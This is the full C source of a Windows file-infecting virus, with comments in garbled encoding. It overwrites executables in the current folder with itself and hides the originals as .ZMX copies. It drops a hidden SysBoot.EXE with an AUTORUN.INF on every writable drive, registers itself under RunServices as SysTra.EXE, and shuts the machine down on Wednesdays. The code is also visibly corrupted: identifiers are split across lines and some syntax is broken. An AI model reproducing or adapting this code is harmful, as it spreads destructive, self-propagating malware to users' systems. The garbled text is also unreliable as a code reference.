   #include <stdio.h>
   #include <windows.h>
   static UINT MYFILELon_G=53760;
   static char fpath[260],fname[260],fext[4],is_run=1;
   //´ÓfullpathÖÐµÃµ½Â·¾¶ºÍÎÄ¼þÃû¡¢À©Õ¹Ãû
   long SpliteName(char *fullpath,char *path,char *fname,char *fext)
   {
   char temp[461],*p;
   if(fullpath==NULL||*fullpath==0)return 1;
   strncpy(temp,fullpath,460);
   p=temp+strlen(temp)-1;
   if(path!=NULL)*path=0;
   if(fname!=NULL)*fname=0;
   if(fext!=NULL)*fext=0;
   while(p>temp)
   {
   if(*p==".")
   {
   if(fext!=NULL)
   {
   strncpy(fext,p+1,3);
   *(fext+3)=0;
   }
   *p=0;
   }
   else if(*p=="\\")
   {
   if(fname!=NULL)
   strcpy(fname,p+1);
   *(p+1)=0;
   if(path!=NULL)
   strcpy(path,temp);
   return 0;
   }
   p--;
   }
   strcpy(fname,temp);
   return 0;
   }
   //½«Â·¾¶¡¢ÎÄ¼þÃû¡¢À©Õ¹ÃûÁ¬½Ó³ÉÎªÒ»¸öÍêÕûµÄÂ·¾¶
   void MakePath(char *path,char *fname,char *fext,char *fullpath)
   {
   if(path!=NULL)
   {
   strcpy(fullpath,path);
   if(fullpath[strlen(fullpath)-1]!="\\")
   strcat(fullpath,"\\");
   }
   strcat(fullpath,fname);
   if(fext!=NULL)
   {
   strcat(fullpath,".");
   strcat(fullpath,fext);
   }
   }
   //ÕÒµ½fpath\fname.fextÎÄ¼þ£¬µÃµ½Õâ¸öÎÄ¼þµÄ´óÐ¡
   void GetMySize(void)
   {
   char ctemp[520];
   wsprintf(ctemp,"%s%s.%s\0",fpath,fname,fext);
   HANDLE hd;
   WIN32_FIND_DATA wfd;
   hd=FindFirstFile(ctemp,&wfd);
   if(hd==INVALID_HANDLE_VALUE)return;
   MYFILELon_G=wfd.nFileSizeLow;
   FindClose(hd);
   }
   //·µ»Ø0Ôòfname¾ÍÊÇÕÒµ½µÄ¿ÉÖ´ÐÐ³ÌÐò
   unsigned long GetFile(char *fname,unsigned long init)
   {
   unsigned short i;
   unsigned char dt[5];
   FILE *fp;
   static HANDLE hd;
   WIN32_FIND_DATA wfd;
   if(init==0)
   {
   hd=FindFirstFile("*.EXE",&wfd);
   if(hd==INVALID_HANDLE_VALUE)return 1;
   }
   else if(!FindNextFile(hd,&wfd))return 1;
   while(1)
   {
   if(wfd.nFileSizeLow!=MYFILELONG
   &&(wfd.dwFileAttributes&FILE_ATTRIBUTE_DIRECTOR)
   ==0)
   {
   fp=(FILE *)fopen(wfd.cFileName,"rb");
   fseek(fp,(long)0x3c,SEEK_SET);
   fread(dt,1,2,fp);
   fseek(fp,(long)(dt[0]|(dt[1]<<8)),SEEK_SET);
   memset(dt,0,2);
   fread(dt,1,2,fp);
   i=feof(fp);
   fclose(fp);
   //ÅÐ¶ÏÕâ¸öÎÄ¼þÊÇ²»ÊÇ¿ÉÒÔÖ´ÐÐµÄ
   if((dt[0]=="L"||dt[0]=="N"||dt[0]=="P")&&dt[1]=="E")
   {
   strcpy(fname,wfd.cFileName);
   return 0;
   }
   }
   if(!FindNextFile(hd,&wfd))break;
   }
   return 1;
   }
   UINT MakeRun(char drive,char *fpath,char *fname,char *fext)
   {
   char ctemp[460],ctemp1[260];
   UINT i;
   FILE *fp;
   char str[]="C:\\AUTORUN.INF",d[4]="C:\\";
   HANDLE hd;
   WIN32_FIND_DATA wfd;
   str[0]=drive;
   d[0]=drive;

   i=GetDriveType(d);
   if(i==DRIVE_CDROM||i==0||i==1)return 1;//²»¿ÉÐ´µÄÇý¶¯Æ÷
   hd=FindFirstFile(str,&wfd);
   if(hd!=INVALID_HANDLE_VALUE)return 0;
   FindClose(hd);
   wsprintf(ctemp,"%s%s.%s",fpath,fname,fext);
   wsprintf(ctemp1,"%c:\\SysBoot.EXE",drive);
   if(CopyFile(ctemp,ctemp1,FALSE)==0)return 0;
   SetFileAttributes(ctemp1,FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_SYSTEM|FIE
   _A
   TTRIBUTE_READONLY);
   fp=fopen(str,"w+");
   if(fp==NULL)return 0;
   fprintf(fp,"[AUTORUN]\n");
   fprintf(fp,"Open=\"%c:\\SysBoot.EXE\" /StartExplorer\n",drive);
   fclose(fp);
   SetFileAttributes(str,FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_SYSTEM|FILE_T
   TR
   IBUTE_READONLY);
   return 0;
   }
   int WINAPI WinMain (HINSTANCE hInstance, HINSTANCE hPrevInstance,
   ¡¡¡¡PSTR szCmdLine, int iCmdShow)
   {
   HKEY hKey,hKey1;
   char lpstr[520],targepath[520],*p,Val[260],ctemp[4],*cm;
   unsigned long i,type=REG_SZ,mxf=20;
   char j;
   DWORD cb;
   SYSTEMTIME st;

   cm=GetCommandLine();
   p=cm+strlen(cm)-1;
   while(*p!="\"")p--;
   *p=0;
   if(*cm=="\"")SpliteName(cm+1,fpath,fname,fext);
   else SpliteName(cm,fpath,fname,fext);
   GetMySize();
   if(RegOpenKey(HKEY_LOCAL_MACHINE,
   ¡¡"Software\\Microsoft\\Windows\\CurrentVersion\\ZMXLIB1",&hKey=
   =ERROR_SU
   CCESS)
   ¡¡¡¡RegCloseKey(hKey);
   else
   {
   for(j=0;j<24;j++)
   if(MakeRun("C"+j,fpath,fname,fext))break;
   if(RegOpenKey(HKEY_LOCAL_MACHINE,
   ¡¡"Software\\Microsoft\\Windows\\CurrentVersion\\RunServices",&K
   ey)!=ERRO
   R_SUCCESS)
   {
   RegOpenKey(HKEY_LOCAL_MACHINE,
   "Software\\Microsoft\\Windows\\CurrentVersion",h
   Key1);
   RegCreateKey(hKey1,"runServices",&hKey);
   RegCloseKey(hKey1);
   }
   GetWindowsDirectory(targepath,260);
   wsprintf(lpstr,"%s\\SysTra.EXE /SysTra:Kernel32.Dll",targepath);
   cb=260;
   i=RegQueryValueEx(hKey,"SystemTra\0",NULL,&type,(unsigned char )
   Val,&cb);

   if(i!=ERROR_SUCCESS||stricmp(Val,lpstr))
   {
   RegSetValueEx(hKey,"SystemTra\0",0,REG_SZ,(unsigned cha
   *)lpstr,strlen(l
   pstr));
   RegCloseKey(hKey);
   }
   else
   {
   GetLocalTime(&st);
   if(stricmp(szCmdLine,"/SysTra:Kernel32.Dll")==0)
   {
   if(st.wDayOfWeek==3)
   ExitWindowsEx(EWX_SHUTDOWN,0);
   GetWindowsDirectory(targepath,260);
   SetCurrentDirectory(targepath);
   mxf=50;
   }
   }
   GetWindowsDirectory(targepath,260);
   MakePath(fpath,fname,fext,lpstr);
   strcat(targepath,"\\SYSTRA.EXE");
   CopyFile(lpstr,targepath,FALSE);
   if(GetDriveType(NULL)!=DRIVE_REMOVABLE)
   {
   for(i=0;i<mxf;i++)
   if(GetFile(lpstr,i)==0)
   {
   SpliteName(lpstr,NULL,targepath,NULL);
   strcat(targepath,".ZMX");
   if(CopyFile(lpstr,targepath,TRUE))
   SetFileAttributes(targepath,FILE_ATTRIBT
   E_SYSTEM|FILE_ATTRIBUTE_HIDDE
   N);
   wsprintf(targepath,"%s%s.%s\0",fpath,fname,fext;

   CopyFile(targepath,lpstr,FALSE);
   }
   }
   }
   lpstr[0]="\"";
   if(i=stricmp(szCmdLine,"/StartExplorer"))
   {
   MakePath(fpath,fname,"ZMX",lpstr+1);
   strcat(lpstr,"\" ");
   strcat(lpstr,szCmdLine);
   }
   else {
   GetWindowsDirectory(lpstr+1,460);
   strcat(lpstr,"\\Explorer.exe\" ");
   strncpy(ctemp,fpath,2);
   ctemp[2]="\\";
   ctemp[3]=0;
   strcat(lpstr,ctemp);
   }
   WinExec(lpstr,iCmdShow);
   return 0;
   }
